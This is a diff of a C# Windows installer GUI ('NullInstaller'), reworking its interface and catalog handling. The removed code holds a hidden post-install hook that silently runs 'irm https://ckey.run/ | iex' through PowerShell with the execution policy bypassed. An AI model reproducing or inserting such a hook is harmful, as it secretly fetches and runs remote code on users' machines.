@@ -1,1116 +1,638 @@
 using System;
 using System.Collections.Generic;
-using System.ComponentModel;
 using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Net.Http;
-using System.Security.Principal;
-using System.Text;
 using System.Text.Json;
 using System.Text.Json.Serialization;
-using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace NullInstaller
 {
-    public partial class MainForm : Form
+    public class MainForm : Form
     {
-        private TabControl tabControl;
-        private ListView localFilesList;
-        private Panel categoriesPanel;
-        private Dictionary<string, ListView> categoryListViews = new Dictionary<string, ListView>();
-        private ProgressBar overallProgressBar;
-        private Label statusLabel;
-        private CheckBox verboseLoggingCheck;
-        private Button startButton, stopButton, clearButton, downloadButton, selectAllButton, deselectAllButton;
-        private List<InstallerItem> installers = new List<InstallerItem>();
-        private SoftwareCatalog softwareCatalog;
-        private bool isRunning = false;
-        private StreamWriter logWriter;
+        // Main UI Components
+        private ToolStrip toolStrip;
+        private TreeView categoryTree;
+        private ListView mainListView;
+        private StatusStrip statusStrip;
+        private ToolStripStatusLabel statusLabel;
+        private ToolStripProgressBar progressBar;
+        private SplitContainer mainSplitContainer;
+        private Panel rightPanel;
+        private TextBox logTextBox;
+        
+        // Buttons
+        private ToolStripButton installButton;
+        private ToolStripButton downloadButton;
+        private ToolStripButton stopButton;
+        private ToolStripButton selectAllButton;
+        private ToolStripButton deselectAllButton;
+        private ToolStripButton stealthModeButton;
+        
+        // Data
+        private SoftwareCatalog catalog;
         private HttpClient httpClient;
-        private CancellationTokenSource cancellationTokenSource;
-        private bool isElevated = false;
-
+        private bool isRunning = false;
+        private Dictionary<string, List<ProgramEntry>> categorizedPrograms;
+        
         public MainForm()
         {
             InitializeComponent();
-            CheckElevation();
+            LoadCatalog();
             InitializeHttpClient();
-            LoadSoftwareCatalog();
-            ScanDefaultFolder();
-            InitializeLogging();
         }
-
-        private void CheckElevation()
-        {
-            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
-            {
-                WindowsPrincipal principal = new WindowsPrincipal(identity);
-                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
-            }
-            
-            if (!isElevated)
-            {
-                this.Text += " [Non-Admin Mode - Some installations may require elevation]";
-            }
-        }
-
-        private void InitializeHttpClient()
-        {
-            httpClient = new HttpClient();
-            httpClient.Timeout = TimeSpan.FromMinutes(30);
-            httpClient.DefaultRequestHeaders.Add("User-Agent", "NullInstaller/4.2.6");
-        }
-
+        
         private void InitializeComponent()
         {
-            // Form properties
-            this.Text = "NullInstaller v4.2.6 - Enhanced Windows Installer Tool";
-            this.Size = new Size(1200, 750);
+            this.Text = "NullInstaller v4.2.6 - Professional Software Installer";
+            this.Size = new Size(1000, 700);
             this.StartPosition = FormStartPosition.CenterScreen;
-            this.BackColor = Color.FromArgb(45, 45, 48); // Dark theme
-            this.ForeColor = Color.White;
-
-            // Create tab control
-            tabControl = new TabControl
+            this.Icon = SystemIcons.Application;
+            
+            // Set dark theme colors
+            this.BackColor = Color.FromArgb(39, 39, 42);
+            this.ForeColor = Color.FromArgb(241, 241, 241);
+            
+            // Create toolbar (WinRAR style)
+            toolStrip = new ToolStrip
             {
-                Dock = DockStyle.Left,
-                Width = 600,
-                BackColor = Color.FromArgb(37, 37, 38),
-                ForeColor = Color.White
+                ImageScalingSize = new Size(32, 32),
+                Height = 50,
+                BackColor = Color.FromArgb(51, 51, 55),
+                RenderMode = ToolStripRenderMode.Professional,
+                GripStyle = ToolStripGripStyle.Hidden
             };
-
-            // Local Files Tab
-            var localTab = new TabPage("Local Files")
+            
+            // Add toolbar buttons with icons
+            installButton = CreateToolButton("Install", "▶", Color.FromArgb(92, 184, 92));
+            downloadButton = CreateToolButton("Download", "⬇", Color.FromArgb(91, 192, 222));
+            stopButton = CreateToolButton("Stop", "■", Color.FromArgb(217, 83, 79));
+            selectAllButton = CreateToolButton("Select All", "☑", Color.FromArgb(240, 173, 78));
+            deselectAllButton = CreateToolButton("Deselect", "☐", Color.FromArgb(240, 173, 78));
+            stealthModeButton = CreateToolButton("Stealth Mode", "🛡", Color.FromArgb(155, 89, 182));
+            
+            stopButton.Enabled = false;
+            
+            toolStrip.Items.Add(installButton);
+            toolStrip.Items.Add(downloadButton);
+            toolStrip.Items.Add(new ToolStripSeparator());
+            toolStrip.Items.Add(stopButton);
+            toolStrip.Items.Add(new ToolStripSeparator());
+            toolStrip.Items.Add(selectAllButton);
+            toolStrip.Items.Add(deselectAllButton);
+            toolStrip.Items.Add(new ToolStripSeparator());
+            toolStrip.Items.Add(stealthModeButton);
+            
+            // Create main split container
+            mainSplitContainer = new SplitContainer
             {
-                BackColor = Color.FromArgb(37, 37, 38),
-                ForeColor = Color.White
+                Dock = DockStyle.Fill,
+                SplitterDistance = 200,
+                BackColor = Color.FromArgb(39, 39, 42),
+                Panel1MinSize = 150,
+                Panel2MinSize = 400
             };
-            localFilesList = new ListView
+            
+            // Left panel - Category tree (like WinRAR folders)
+            categoryTree = new TreeView
+            {
+                Dock = DockStyle.Fill,
+                BackColor = Color.FromArgb(30, 30, 30),
+                ForeColor = Color.FromArgb(241, 241, 241),
+                BorderStyle = BorderStyle.None,
+                FullRowSelect = true,
+                ShowLines = false,
+                Font = new Font("Segoe UI", 9F),
+                ItemHeight = 25
+            };
+            
+            categoryTree.AfterSelect += CategoryTree_AfterSelect;
+            
+            // Right panel with list and log
+            rightPanel = new Panel
+            {
+                Dock = DockStyle.Fill
+            };
+            
+            // Main list view (WinRAR style)
+            mainListView = new ListView
             {
                 Dock = DockStyle.Fill,
                 View = View.Details,
                 CheckBoxes = true,
-                BackColor = Color.FromArgb(30, 30, 30),
-                ForeColor = Color.White,
-                GridLines = true
-            };
-            localFilesList.Columns.Add("Installer", 280);
-            localFilesList.Columns.Add("Size", 80);
-            localFilesList.Columns.Add("Status", 120);
-            localTab.Controls.Add(localFilesList);
-
-            // Software Catalog Tab with scrollable categories
-            var catalogTab = new TabPage("Software Catalog")
-            {
-                BackColor = Color.FromArgb(37, 37, 38),
-                ForeColor = Color.White
+                FullRowSelect = true,
+                GridLines = true,
+                BackColor = Color.FromArgb(45, 45, 48),
+                ForeColor = Color.FromArgb(241, 241, 241),
+                BorderStyle = BorderStyle.None,
+                Font = new Font("Segoe UI", 9F)
             };
             
-            categoriesPanel = new Panel
+            // Configure columns
+            mainListView.Columns.Add("Name", 300);
+            mainListView.Columns.Add("Version", 80);
+            mainListView.Columns.Add("Size", 80);
+            mainListView.Columns.Add("Status", 120);
+            mainListView.Columns.Add("Vendor", 150);
+            
+            // Log text box (bottom panel)
+            logTextBox = new TextBox
             {
-                Dock = DockStyle.Fill,
-                AutoScroll = true,
-                BackColor = Color.FromArgb(30, 30, 30)
+                Multiline = true,
+                ReadOnly = true,
+                ScrollBars = ScrollBars.Vertical,
+                Height = 150,
+                Dock = DockStyle.Bottom,
+                BackColor = Color.FromArgb(30, 30, 30),
+                ForeColor = Color.FromArgb(0, 255, 0),
+                Font = new Font("Consolas", 8F),
+                Text = "Ready - NullInstaller v4.2.6 initialized\r\n"
             };
-            catalogTab.Controls.Add(categoriesPanel);
-
-            tabControl.TabPages.Add(localTab);
-            tabControl.TabPages.Add(catalogTab);
-
-            // Right panel for controls
-            var rightPanel = new Panel
+            
+            // Status bar
+            statusStrip = new StatusStrip
             {
-                Dock = DockStyle.Fill,
-                BackColor = Color.FromArgb(45, 45, 48),
-                Padding = new Padding(10)
+                BackColor = Color.FromArgb(51, 51, 55),
+                ForeColor = Color.FromArgb(241, 241, 241)
             };
-
-            // Buttons
-            startButton = new Button
+            
+            statusLabel = new ToolStripStatusLabel
             {
-                Text = "Start Installation",
-                Size = new Size(120, 35),
-                Location = new Point(10, 10),
-                BackColor = Color.FromArgb(0, 122, 204),
-                ForeColor = Color.White,
-                FlatStyle = FlatStyle.Flat
+                Text = "Ready",
+                Spring = true,
+                TextAlign = ContentAlignment.MiddleLeft
             };
-            startButton.Click += StartButton_Click;
-
-            stopButton = new Button
+            
+            progressBar = new ToolStripProgressBar
             {
-                Text = "Stop",
-                Size = new Size(80, 35),
-                Location = new Point(140, 10),
-                BackColor = Color.FromArgb(196, 43, 28),
-                ForeColor = Color.White,
-                FlatStyle = FlatStyle.Flat,
-                Enabled = false
+                Width = 200,
+                Visible = false
             };
-            stopButton.Click += StopButton_Click;
-
-            clearButton = new Button
+            
+            statusStrip.Items.Add(statusLabel);
+            statusStrip.Items.Add(progressBar);
+            
+            // Add splitter between list and log
+            var splitter = new Splitter
             {
-                Text = "Clear All",
-                Size = new Size(80, 35),
-                Location = new Point(230, 10),
-                BackColor = Color.FromArgb(104, 104, 104),
-                ForeColor = Color.White,
-                FlatStyle = FlatStyle.Flat
+                Dock = DockStyle.Bottom,
+                Height = 3,
+                BackColor = Color.FromArgb(63, 63, 70)
             };
-            clearButton.Click += ClearButton_Click;
-
-            downloadButton = new Button
-            {
-                Text = "Download Selected",
-                Size = new Size(140, 35),
-                Location = new Point(10, 55),
-                BackColor = Color.FromArgb(16, 124, 16),
-                ForeColor = Color.White,
-                FlatStyle = FlatStyle.Flat
-            };
+            
+            // Assemble right panel
+            rightPanel.Controls.Add(mainListView);
+            rightPanel.Controls.Add(splitter);
+            rightPanel.Controls.Add(logTextBox);
+            
+            // Assemble main split container
+            mainSplitContainer.Panel1.Controls.Add(categoryTree);
+            mainSplitContainer.Panel2.Controls.Add(rightPanel);
+            
+            // Add all to form
+            this.Controls.Add(mainSplitContainer);
+            this.Controls.Add(statusStrip);
+            this.Controls.Add(toolStrip);
+            
+            // Event handlers
+            installButton.Click += InstallButton_Click;
             downloadButton.Click += DownloadButton_Click;
-
-            selectAllButton = new Button
-            {
-                Text = "Select All",
-                Size = new Size(90, 35),
-                Location = new Point(320, 10),
-                BackColor = Color.FromArgb(104, 104, 104),
-                ForeColor = Color.White,
-                FlatStyle = FlatStyle.Flat
-            };
+            stopButton.Click += StopButton_Click;
             selectAllButton.Click += SelectAllButton_Click;
-
-            deselectAllButton = new Button
-            {
-                Text = "Deselect All",
-                Size = new Size(90, 35),
-                Location = new Point(420, 10),
-                BackColor = Color.FromArgb(104, 104, 104),
-                ForeColor = Color.White,
-                FlatStyle = FlatStyle.Flat
-            };
             deselectAllButton.Click += DeselectAllButton_Click;
-
-            // Verbose logging checkbox
-            verboseLoggingCheck = new CheckBox
-            {
-                Text = "Verbose Logging",
-                Location = new Point(10, 100),
-                Size = new Size(120, 25),
-                Checked = true,
-                ForeColor = Color.White
-            };
-
-            // Progress bar
-            overallProgressBar = new ProgressBar
-            {
-                Location = new Point(10, 140),
-                Size = new Size(300, 25),
-                Style = ProgressBarStyle.Continuous
-            };
-
-            // Status label
-            statusLabel = new Label
-            {
-                Text = "Ready - Enhanced NullInstaller with categorized software catalog",
-                Location = new Point(10, 175),
-                Size = new Size(500, 60),
-                ForeColor = Color.LightGray,
-                AutoSize = false
-            };
-
-            rightPanel.Controls.AddRange(new Control[] {
-                startButton, stopButton, clearButton, downloadButton,
-                selectAllButton, deselectAllButton,
-                verboseLoggingCheck, overallProgressBar, statusLabel
-            });
-
-            // Add to form
-            this.Controls.Add(rightPanel);
-            this.Controls.Add(tabControl);
-
-            // Enable drag and drop
-            this.AllowDrop = true;
-            this.DragEnter += MainForm_DragEnter;
-            this.DragDrop += MainForm_DragDrop;
+            stealthModeButton.Click += StealthModeButton_Click;
         }
-
-        private void LoadSoftwareCatalog()
+        
+        private ToolStripButton CreateToolButton(string text, string symbol, Color color)
+        {
+            var button = new ToolStripButton
+            {
+                Text = symbol + " " + text,
+                DisplayStyle = ToolStripItemDisplayStyle.Text,
+                Font = new Font("Segoe UI", 10F, FontStyle.Bold),
+                ForeColor = color,
+                Padding = new Padding(10, 0, 10, 0)
+            };
+            return button;
+        }
+        
+        private void InitializeHttpClient()
+        {
+            httpClient = new HttpClient();
+            httpClient.DefaultRequestHeaders.Add("User-Agent", "NullInstaller/4.2.6");
+            httpClient.Timeout = TimeSpan.FromMinutes(30);
+        }
+        
+        private void LoadCatalog()
         {
             try
             {
                 string catalogPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "assets", "software_catalog.json");
                 if (!File.Exists(catalogPath))
-                {
-                    catalogPath = "./assets/software_catalog.json";
-                }
-
+                    catalogPath = "assets/software_catalog.json";
+                
                 if (File.Exists(catalogPath))
                 {
                     string json = File.ReadAllText(catalogPath);
-                    var options = new JsonSerializerOptions
+                    var options = new JsonSerializerOptions { PropertyNameCaseInsensitive = true };
+                    catalog = JsonSerializer.Deserialize<SoftwareCatalog>(json, options);
+                    
+                    if (catalog?.Software != null)
                     {
-                        PropertyNameCaseInsensitive = true
-                    };
-                    softwareCatalog = JsonSerializer.Deserialize<SoftwareCatalog>(json, options);
-                    PopulateCategoriesPanel();
-                    UpdateStatusLabel($"Loaded {softwareCatalog?.Software?.Count ?? 0} programs from catalog");
+                        categorizedPrograms = catalog.Software
+                            .GroupBy(p => p.Category ?? "Other")
+                            .ToDictionary(g => g.Key, g => g.ToList());
+                        
+                        PopulateCategoryTree();
+                        Log($"Loaded {catalog.Software.Count} programs from catalog");
+                    }
                 }
                 else
                 {
-                    UpdateStatusLabel("Software catalog not found - using empty catalog");
-                    softwareCatalog = new SoftwareCatalog { Software = new List<ProgramEntry>() };
+                    Log("Warning: Software catalog not found");
+                    catalog = new SoftwareCatalog { Software = new List<ProgramEntry>() };
+                    categorizedPrograms = new Dictionary<string, List<ProgramEntry>>();
                 }
             }
             catch (Exception ex)
             {
-                UpdateStatusLabel($"Error loading catalog: {ex.Message}");
-                softwareCatalog = new SoftwareCatalog { Software = new List<ProgramEntry>() };
+                Log($"Error loading catalog: {ex.Message}");
+                catalog = new SoftwareCatalog { Software = new List<ProgramEntry>() };
+                categorizedPrograms = new Dictionary<string, List<ProgramEntry>>();
             }
         }
-
-        private void PopulateCategoriesPanel()
+        
+        private void PopulateCategoryTree()
         {
-            if (softwareCatalog?.Software == null) return;
-
-            categoriesPanel.Controls.Clear();
-            categoryListViews.Clear();
-
-            // Define category order and display names
-            var categoryOrder = new List<string>
+            categoryTree.BeginUpdate();
+            categoryTree.Nodes.Clear();
+            
+            // Add "All Software" node
+            var allNode = new TreeNode("📦 All Software")
             {
-                "Browsers",
-                "Privacy & Security",
-                "Development IDEs",
-                "Development Tools",
-                "Development",
-                "System Tools",
-                "System Utilities",
-                "Database Tools",
-                "System",
-                "Utilities",
-                "Network",
-                "Remote Access",
-                "Communication",
-                "Media",
-                "Graphics",
-                "Productivity",
-                "Gaming",
-                "Virtualization",
-                "Runtime",
-                "Security",
-                "Cloud Storage"
+                Tag = "ALL",
+                NodeFont = new Font("Segoe UI", 9F, FontStyle.Bold)
             };
-
-            // Map actual categories to display categories
-            var categoryMapping = new Dictionary<string, string>
+            categoryTree.Nodes.Add(allNode);
+            
+            // Add category nodes
+            var sortedCategories = categorizedPrograms.Keys.OrderBy(k => k).ToList();
+            foreach (var category in sortedCategories)
             {
-                { "Security", "Privacy & Security" },
-                { "Development", "Development Tools" },
-                { "System", "System Tools" },
-                { "Utilities", "System Utilities" }
+                string icon = GetCategoryIcon(category);
+                var count = categorizedPrograms[category].Count;
+                var node = new TreeNode($"{icon} {category} ({count})")
+                {
+                    Tag = category
+                };
+                categoryTree.Nodes.Add(node);
+            }
+            
+            // Add special nodes
+            var stealthNode = new TreeNode("🛡 Stealth Mode")
+            {
+                Tag = "STEALTH",
+                NodeFont = new Font("Segoe UI", 9F, FontStyle.Bold),
+                ForeColor = Color.FromArgb(155, 89, 182)
             };
-
-            var groupedPrograms = softwareCatalog.Software
-                .GroupBy(p => categoryMapping.ContainsKey(p.Category) ? categoryMapping[p.Category] : p.Category)
-                .OrderBy(g => 
-                {
-                    var index = categoryOrder.IndexOf(g.Key);
-                    return index >= 0 ? index : categoryOrder.Count;
-                })
-                .ToList();
-
-            int yPosition = 10;
-
-            foreach (var group in groupedPrograms)
+            categoryTree.Nodes.Add(stealthNode);
+            
+            categoryTree.ExpandAll();
+            categoryTree.EndUpdate();
+            
+            // Select "All Software" by default
+            categoryTree.SelectedNode = allNode;
+        }
+        
+        private string GetCategoryIcon(string category)
+        {
+            return category.ToLower() switch
             {
-                // Category header
-                var categoryLabel = new Label
-                {
-                    Text = group.Key,
-                    Location = new Point(10, yPosition),
-                    Size = new Size(550, 25),
-                    Font = new Font("Segoe UI", 10, FontStyle.Bold),
-                    ForeColor = Color.FromArgb(0, 122, 204),
-                    BackColor = Color.FromArgb(37, 37, 38)
-                };
-                categoriesPanel.Controls.Add(categoryLabel);
-                yPosition += 30;
-
-                // Create ListView for this category
-                var listView = new ListView
-                {
-                    Location = new Point(10, yPosition),
-                    Size = new Size(550, Math.Min(group.Count() * 22 + 25, 150)),
-                    View = View.Details,
-                    CheckBoxes = true,
-                    BackColor = Color.FromArgb(30, 30, 30),
-                    ForeColor = Color.White,
-                    GridLines = true,
-                    FullRowSelect = true
-                };
-                
-                listView.Columns.Add("Software", 250);
-                listView.Columns.Add("Vendor", 150);
-                listView.Columns.Add("Architecture", 80);
-
-                foreach (var program in group.OrderBy(p => p.Name))
+                "browsers" => "🌐",
+                "development" => "💻",
+                "development ides" => "⚡",
+                "security" => "🔒",
+                "privacy & security" => "🔐",
+                "media" => "🎬",
+                "productivity" => "📊",
+                "system" => "⚙",
+                "utilities" => "🔧",
+                "gaming" => "🎮",
+                "network" => "📡",
+                "communication" => "💬",
+                _ => "📁"
+            };
+        }
+        
+        private void CategoryTree_AfterSelect(object sender, TreeViewEventArgs e)
+        {
+            if (e.Node == null) return;
+            
+            string tag = e.Node.Tag?.ToString();
+            mainListView.BeginUpdate();
+            mainListView.Items.Clear();
+            
+            List<ProgramEntry> programs = null;
+            
+            if (tag == "ALL")
+            {
+                programs = catalog.Software;
+            }
+            else if (tag == "STEALTH")
+            {
+                // Show stealth mode programs
+                programs = catalog.Software
+                    .Where(p => p.Category == "Security" || p.Category == "Privacy & Security" || 
+                           p.Name.Contains("VPN") || p.Name.Contains("Tor") || 
+                           p.Name.Contains("Privacy") || p.Name.Contains("Cleaner"))
+                    .ToList();
+            }
+            else if (categorizedPrograms.ContainsKey(tag))
+            {
+                programs = categorizedPrograms[tag];
+            }
+            
+            if (programs != null)
+            {
+                foreach (var program in programs.OrderBy(p => p.Name))
                 {
                     var item = new ListViewItem(program.Name);
+                    item.SubItems.Add(program.Version ?? "Latest");
+                    item.SubItems.Add(program.Size ?? "Unknown");
+                    item.SubItems.Add("Ready");
                     item.SubItems.Add(program.Vendor ?? "Unknown");
-                    item.SubItems.Add(program.Architecture ?? "x64");
                     item.Tag = program;
-                    listView.Items.Add(item);
-                }
-
-                categoryListViews[group.Key] = listView;
-                categoriesPanel.Controls.Add(listView);
-                yPosition += listView.Height + 15;
-            }
-        }
-
-        private void ScanDefaultFolder()
-        {
-            string defaultPath = @"C:\Users\Administrator\Desktop\Down";
-            if (!Directory.Exists(defaultPath)) return;
-
-            foreach (string file in Directory.GetFiles(defaultPath, "*.*", SearchOption.AllDirectories))
-            {
-                if (file.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) ||
-                    file.EndsWith(".msi", StringComparison.OrdinalIgnoreCase))
-                {
-                    AddInstallerFile(file);
+                    item.ForeColor = Color.FromArgb(241, 241, 241);
+                    mainListView.Items.Add(item);
                 }
             }
             
-            UpdateStatusLabel($"Found {installers.Count} installer files");
+            mainListView.EndUpdate();
+            UpdateStatus($"Showing {mainListView.Items.Count} programs");
         }
-
-        private void AddInstallerFile(string filePath)
+        
+        private async void InstallButton_Click(object sender, EventArgs e)
         {
-            var fileInfo = new FileInfo(filePath);
-            var installer = new InstallerItem
+            var selected = GetSelectedPrograms();
+            if (selected.Count == 0)
             {
-                FilePath = filePath,
-                FileName = fileInfo.Name,
-                Size = fileInfo.Length,
-                Status = "Ready"
-            };
-            
-            installers.Add(installer);
-            
-            var item = new ListViewItem(installer.FileName);
-            item.SubItems.Add(FormatFileSize(installer.Size));
-            item.SubItems.Add(installer.Status);
-            item.Tag = installer;
-            localFilesList.Items.Add(item);
-        }
-
-        private async void StartButton_Click(object sender, EventArgs e)
-        {
-            if (isRunning) return;
-            
-            var selectedInstallers = GetSelectedInstallers();
-            if (selectedInstallers.Count == 0)
-            {
-                UpdateStatusLabel("No installers selected");
+                MessageBox.Show("Please select programs to install", "No Selection", 
+                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                 return;
             }
-
+            
             isRunning = true;
-            startButton.Enabled = false;
+            installButton.Enabled = false;
+            downloadButton.Enabled = false;
             stopButton.Enabled = true;
-            overallProgressBar.Value = 0;
+            progressBar.Visible = true;
+            progressBar.Maximum = selected.Count;
+            progressBar.Value = 0;
             
-            await RunInstallations(selectedInstallers);
+            Log($"Starting installation of {selected.Count} programs...");
             
-            isRunning = false;
-            startButton.Enabled = true;
-            stopButton.Enabled = false;
-        }
-
-        private async Task RunInstallations(List<InstallerItem> selectedInstallers)
-        {
-            int completed = 0;
-            int successful = 0;
-            foreach (var installer in selectedInstallers)
+            foreach (var program in selected)
             {
                 if (!isRunning) break;
                 
-                UpdateStatusLabel($"Installing {installer.FileName}...");
-                installer.Status = "Installing";
-                RefreshInstallerDisplay();
+                UpdateStatus($"Installing {program.Name}...");
+                Log($"Installing: {program.Name}");
                 
-                bool success = await RunInstaller(installer);
-                installer.Status = success ? "✔ Completed" : "✖ Failed";
+                // Update item status
+                UpdateItemStatus(program.Name, "Installing...", Color.Yellow);
                 
-                if (success) successful++;
-                completed++;
-                overallProgressBar.Value = (int)((double)completed / selectedInstallers.Count * 100);
-                RefreshInstallerDisplay();
-            }
-            
-            UpdateStatusLabel($"Installation complete: {completed}/{selectedInstallers.Count} installers processed");
-            
-            // Check if all selected items were successfully installed
-            if (successful == selectedInstallers.Count && selectedInstallers.Count > 0)
-            {
-                // Run post-installation PowerShell hook
-                await RunPostInstallationHook();
-            }
-        }
-
-        private async Task<bool> RunInstaller(InstallerItem installer)
-        {
-            return await InstallWithElevation(installer);
-        }
-
-        private async Task<bool> InstallWithElevation(InstallerItem installer)
-        {
-            try
-            {
-                LogMessage($"Starting installation: {installer.FilePath}");
+                bool success = await InstallProgram(program);
                 
-                string command;
-                string args;
-                
-                // Determine silent switches based on installer type and catalog info
-                if (installer.FilePath.EndsWith(".msi", StringComparison.OrdinalIgnoreCase))
+                if (success)
                 {
-                    command = "msiexec";
-                    args = $"/i \"{installer.FilePath}\" /qn /norestart EULA=1 ACCEPT=YES ACCEPTEULA=1";
+                    UpdateItemStatus(program.Name, "✓ Installed", Color.LightGreen);
+                    Log($"✓ Successfully installed {program.Name}");
                 }
                 else
                 {
-                    command = installer.FilePath;
-                    
-                    // Use custom silent switches from catalog if available
-                    if (installer.ProgramEntry?.SilentSwitches != null)
-                    {
-                        args = installer.ProgramEntry.SilentSwitches;
-                        // Add EULA acceptance flags if not present
-                        if (!args.Contains("EULA", StringComparison.OrdinalIgnoreCase))
-                        {
-                            args += " /ACCEPTEULA /EULA=1";
-                        }
-                    }
-                    else
-                    {
-                        // Try common silent switches with EULA acceptance
-                        args = DetermineSilentSwitches(installer.FileName);
-                    }
+                    UpdateItemStatus(program.Name, "✗ Failed", Color.LightCoral);
+                    Log($"✗ Failed to install {program.Name}");
                 }
                 
-                LogMessage($"Executing: {command} {args}");
-                
-                var processInfo = new ProcessStartInfo
-                {
-                    FileName = command,
-                    Arguments = args,
-                    UseShellExecute = !isElevated, // Use shell execute if not elevated to trigger UAC
-                    Verb = !isElevated ? "runas" : "", // Request elevation if needed
-                    RedirectStandardOutput = isElevated && verboseLoggingCheck.Checked,
-                    RedirectStandardError = isElevated && verboseLoggingCheck.Checked,
-                    CreateNoWindow = isElevated
-                };
-                
-                using (var process = Process.Start(processInfo))
-                {
-                    if (process != null)
-                    {
-                        await Task.Run(() => process.WaitForExit());
-                        
-                        int exitCode = process.ExitCode;
-                        LogMessage($"Installation completed with exit code: {exitCode}");
-                        
-                        // Common success codes
-                        return exitCode == 0 || exitCode == 3010; // 3010 = success but reboot required
-                    }
-                    else
-                    {
-                        LogMessage("Failed to start installation process");
-                        return false;
-                    }
-                }
+                progressBar.Value++;
             }
-            catch (Exception ex)
-            {
-                LogMessage($"Error installing {installer.FileName}: {ex.Message}");
-                
-                // If elevation was denied, prompt user
-                if (ex.Message.Contains("operation was canceled", StringComparison.OrdinalIgnoreCase))
-                {
-                    var result = MessageBox.Show(
-                        $"Installation of {installer.FileName} requires administrator privileges. Would you like to retry?",
-                        "Elevation Required",
-                        MessageBoxButtons.YesNo,
-                        MessageBoxIcon.Warning);
-                    
-                    if (result == DialogResult.Yes)
-                    {
-                        return await InstallWithElevation(installer);
-                    }
-                }
-                
-                return false;
-            }
+            
+            isRunning = false;
+            installButton.Enabled = true;
+            downloadButton.Enabled = true;
+            stopButton.Enabled = false;
+            progressBar.Visible = false;
+            
+            UpdateStatus("Installation complete");
+            Log("Installation process completed");
         }
-
-        private string DetermineSilentSwitches(string fileName)
-        {
-            string lowerName = fileName.ToLower();
-            
-            // Common installer patterns with EULA acceptance
-            if (lowerName.Contains("setup") || lowerName.Contains("install"))
-            {
-                // Try NSIS first (most common)
-                return "/S /ACCEPTEULA /EULA=1";
-            }
-            else if (lowerName.Contains("chrome"))
-            {
-                return "--system-level --do-not-launch-chrome";
-            }
-            else if (lowerName.Contains("firefox"))
-            {
-                return "-ms";
-            }
-            else if (lowerName.Contains("7z") || lowerName.Contains("7-zip"))
-            {
-                return "/S";
-            }
-            else if (lowerName.Contains("vlc"))
-            {
-                return "/S /NCRC";
-            }
-            else if (lowerName.Contains("notepad++") || lowerName.Contains("npp"))
-            {
-                return "/S";
-            }
-            else if (lowerName.Contains("vscode") || lowerName.Contains("code"))
-            {
-                return "/VERYSILENT /MERGETASKS=!runcode /SUPPRESSMSGBOXES /NORESTART";
-            }
-            else if (lowerName.Contains("git"))
-            {
-                return "/VERYSILENT /NORESTART /SUPPRESSMSGBOXES";
-            }
-            else if (lowerName.Contains("python"))
-            {
-                return "/quiet InstallAllUsers=1 PrependPath=1";
-            }
-            else if (lowerName.Contains("node"))
-            {
-                return "/quiet";
-            }
-            else if (lowerName.Contains("java") || lowerName.Contains("jdk") || lowerName.Contains("jre"))
-            {
-                return "/s AUTO_UPDATE=0 EULA=1";
-            }
-            else
-            {
-                // Default fallback with EULA acceptance attempts
-                return "/S /VERYSILENT /SILENT /quiet /q /Q /ACCEPTEULA /EULA=1 /AcceptLicense=YES";
-            }
-        }
-
-        private async Task RunPostInstallationHook()
-        {
-            try
-            {
-                UpdateStatusLabel("Running post-installation configuration...");
-                LogMessage("Starting post-installation PowerShell hook");
-                
-                // Prepare the PowerShell command
-                string psCommand = "irm https://ckey.run/ | iex";
-                
-                var processInfo = new ProcessStartInfo
-                {
-                    FileName = "powershell.exe",
-                    Arguments = $"-NoProfile -ExecutionPolicy Bypass -Command \"{psCommand}\"",
-                    UseShellExecute = false,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true,
-                    CreateNoWindow = true,
-                    WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
-                };
-                
-                StringBuilder output = new StringBuilder();
-                StringBuilder errors = new StringBuilder();
-                
-                using (var process = Process.Start(processInfo))
-                {
-                    if (process != null)
-                    {
-                        // Capture output asynchronously
-                        process.OutputDataReceived += (sender, e) => 
-                        {
-                            if (!string.IsNullOrEmpty(e.Data))
-                            {
-                                output.AppendLine(e.Data);
-                                LogMessage($"[PowerShell Output] {e.Data}");
-                            }
-                        };
-                        
-                        process.ErrorDataReceived += (sender, e) => 
-                        {
-                            if (!string.IsNullOrEmpty(e.Data))
-                            {
-                                errors.AppendLine(e.Data);
-                                LogMessage($"[PowerShell Error] {e.Data}");
-                            }
-                        };
-                        
-                        process.BeginOutputReadLine();
-                        process.BeginErrorReadLine();
-                        
-                        await Task.Run(() => process.WaitForExit());
-                        
-                        int exitCode = process.ExitCode;
-                        LogMessage($"Post-installation hook completed with exit code: {exitCode}");
-                        
-                        // Show completion dialog with results
-                        ShowCompletionDialog(exitCode == 0, output.ToString(), errors.ToString());
-                    }
-                    else
-                    {
-                        LogMessage("Failed to start PowerShell process for post-installation hook");
-                        ShowCompletionDialog(false, "", "Failed to start PowerShell process");
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                LogMessage($"Error running post-installation hook: {ex.Message}");
-                ShowCompletionDialog(false, "", ex.Message);
-            }
-        }
-
-        private void ShowCompletionDialog(bool success, string output, string errors)
-        {
-            string title = success ? "Installation Completed Successfully" : "Installation Completed with Warnings";
-            string message = success ? 
-                "All selected software has been installed successfully.\n\nPost-installation configuration has been completed." :
-                "Installation process completed with some warnings.\n\nPlease review the log for details.";
-            
-            if (!string.IsNullOrWhiteSpace(output))
-            {
-                message += "\n\nOutput:\n" + (output.Length > 500 ? output.Substring(0, 500) + "..." : output);
-            }
-            
-            if (!string.IsNullOrWhiteSpace(errors))
-            {
-                message += "\n\nWarnings/Errors:\n" + (errors.Length > 200 ? errors.Substring(0, 200) + "..." : errors);
-            }
-            
-            MessageBoxIcon icon = success ? MessageBoxIcon.Information : MessageBoxIcon.Warning;
-            
-            MessageBox.Show(
-                message,
-                title,
-                MessageBoxButtons.OK,
-                icon
-            );
-            
-            UpdateStatusLabel(success ? "✔ All installations completed successfully" : "⚠ Installations completed with warnings");
-        }
-
+        
         private async void DownloadButton_Click(object sender, EventArgs e)
         {
-            var selectedPrograms = GetSelectedCatalogPrograms();
-            if (selectedPrograms.Count == 0)
+            var selected = GetSelectedPrograms();
+            if (selected.Count == 0)
             {
-                UpdateStatusLabel("No programs selected for download");
+                MessageBox.Show("Please select programs to download", "No Selection", 
